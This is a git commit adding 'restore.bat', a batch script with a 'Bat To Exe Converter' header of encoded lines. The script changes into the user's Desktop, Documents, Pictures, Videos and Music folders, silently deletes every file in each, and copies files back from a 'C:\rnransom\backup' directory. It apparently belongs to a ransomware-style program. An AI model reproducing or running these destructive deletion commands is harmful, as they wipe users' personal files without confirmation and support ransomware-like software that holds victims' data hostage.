c914f5993d8060e74e6e643d9fcf43c9d4c0b5c5
ryutonakamura <137345118+ryutonakamura@users.noreply.github.com>
2024-01-06 15:41:55 -0500

    Add files via upload

---
+++ restore.bat
@@ -0,0 +1,48 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFAlNWRCNAE+1EbsQ5+n//NaVo0MOW+8D/nkLWVV5owH3aaYR9nTkVZmRGyjsj/iEPlr5JzMzr3pQt2qWOMqfoQrgXkebqE4oHgU=
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+cd %HOMEDRIVE%%HOMEPATH%\desktop\
+del * /q
+xcopy C:\rnransom\backup\dsk %HOMEDRIVE%%HOMEPATH%\desktop\
+cd %HOMEDRIVE%%HOMEPATH%\documents\
+del * /q
+xcopy C:\rnransom\backup\dcm %HOMEDRIVE%%HOMEPATH%\documents\
+cd %HOMEDRIVE%%HOMEPATH%\pictures\
+del * /q
+xcopy C:\rnransom\backup\pct %HOMEDRIVE%%HOMEPATH%\pictures\
+cd %HOMEDRIVE%%HOMEPATH%\videos\
+del * /q
+xcopy C:\rnransom\backup\vds %HOMEDRIVE%%HOMEPATH%\videos\
+cd %HOMEDRIVE%%HOMEPATH%\music\
+del * /q
+xcopy C:\rnransom\backup\mus %HOMEDRIVE%%HOMEPATH%\music\
